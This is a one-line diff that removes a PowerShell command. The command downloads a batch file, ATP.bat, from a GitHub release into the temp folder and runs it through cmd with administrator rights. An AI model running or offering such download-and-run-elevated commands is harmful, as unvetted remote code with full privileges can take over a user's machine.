@@ -1,1 +1,0 @@
-irm "https://github.com/gloomycrow/ATP/releases/download/ATP/ATP.bat" -OutFile "$env:TEMP\ATP.bat"; Start-Process cmd -Args "/c "$env:TEMP\ATP.bat"" -Verb RunAs
